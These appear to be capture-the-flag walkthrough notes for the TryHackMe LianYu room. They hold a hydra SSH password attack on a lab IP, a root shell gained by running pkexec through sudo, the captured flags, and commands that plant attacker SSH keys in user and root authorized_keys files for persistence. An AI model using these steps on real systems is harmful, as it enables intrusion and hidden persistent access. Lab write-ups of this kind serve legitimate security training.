### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCrlioChuUS620Cb9IQpUgf6HRpasmmz2eBl8CZ379IV0DEjQJ0t58TIYShzj1Y0X+cYTy8VbmUwBtpBoWrlmw/KspCHi42QTw8MMEtjELmyl7kNdcnoS7gGXwp18EA1wHpCL/V4KrD5Jop9Ab159OdvpzivQmJDe5myffo0KysnSqyH0vIoEnWc41JurKZFfWHc/VIEsqvO2Z00k7FhxSccFrfzqd99aNNUnmAZdIKZwvmKb1xoYPY2HAjPLiG1LjZAcxIj4A2NleO+xlIoJ/B+ZqW3wyp06EZ/OnHAfRysAdhTlB+Iha14QFOpWJdr+wov+R1IbdB00NfjaUsQEKlNxcPtLTh0BoVzCHPKejAyW+gxs0A0dwS86Vf6gTD7CmcznCOHjp9aIo/VT3OQZ2UzDCiriSEeG9lDAPdQEMFMs+6zl2Oo8g/6RE5Zdz6lO0OW+xbLWC9P0T9vaizuZMSt3IuhowNOs1hjP8J4GOgNm1mcLDs9YxdVl69RV4jXfW+K6P7iuM+YCfjxxuC+ts9nXPR8Y+dhIS377yy9K2/OjUegAazX63pgZTZdwTtqxeEOoSNxAOedD1mnUqriKUVCcn8ephJQ7PO+ZpmWiRknEBj2j1JWuPH4da3QHYik9XbzOH3ePzzeefC77imCliroLBC6V6pPKwKrWPn2ZqwZw== your_email@example.com" >> /home/slade/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCleR8PbAcrd0hGSUuY6diLNBO+CYuHFr043HO1A+PdmClUV8jSoZ77rVCWZOnGb3Xep/kMGOV0/os7db9Vm3n+a6yrVfGprGsuITtPtINiCJ4XIY2lLYNOgdce5/rmekm5mX+mCsMOc2VDJd1CjXlhFR+O1ppBafZ/lkxB+/+gbqp03WoApacv5pSyq55ETkMTxIiK4aWIUwLMUU8FstYkl9s3i1wUQSGs4VSnEvZeUHzvs7grL2nwYCpxkpDR0ZVxeSWQrjtONIED40EdAYpwXyvhLbkV8y09lFm6HKCGNfYPAO3ol02M4xACXzee6r1LSHNWsDA1LKOHWEr6+nLX3z+f6O8RHgFhAm1wBXcMfJGGfRnkmA7RaNgEC28WjBS0sP8nRIa0KhxfDbCTGrtP/pbrf8yX1iqidAGBfgsEJ0EvQmTkIjZVqYuYZOqVXQ2Ij1ul6DbwXtFyMDVrsANvNmbWnj4Yy3/f2YTvtp0/zUYaGHR1RyrM1TzCd4qYxcEMm09s7rm3ceqKqg8ngWUp7zmCmIt7Z25xWRjkOK21m5EWpNTBjriom/qnqMGy7gkyf+B2y27XLzqOqPOYJzAigZwWlZfOgqjZ4E06kUVFVnn20l6W3rTtz2U6M5UhM+QthDoC9WzBcmTCF6l5neaXp94Ejdyq6LhQtaIdrNQjmQ== your_email@example.com" >> /root/.ssh/authorized_keys
```


```
hydra -L ssh_users.md -p M3tahuman -e nsr -o /opt/THM/LianYu/2-enum/ftp/hydra_ssh.md ssh://10.10.207.39
```

```
[DATA] attacking ssh://10.10.207.39:22/
[22][ssh] host: 10.10.207.39   login: slade   password: M3tahuman
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-20 14:37:54
```

login to ssh now

```
slade
M3tahuman
```

```
slade@LianYu:~$ whoami
slade
slade@LianYu:~$ uname -a
Linux LianYu 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13) x86_64 GNU/Linux
```

/home/slade/user.txt

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak

```

```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

```
sudo /usr/bin/pkexec /bin/bash
```

```
root@LianYu:~# whoami
root
root@LianYu:~# sudo -l
Matching Defaults entries for root on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User root may run the following commands on LianYu:
    (ALL : ALL) ALL
root@LianYu:~# uname -a
Linux LianYu 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13) x86_64 GNU/Linux

```

```
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825


```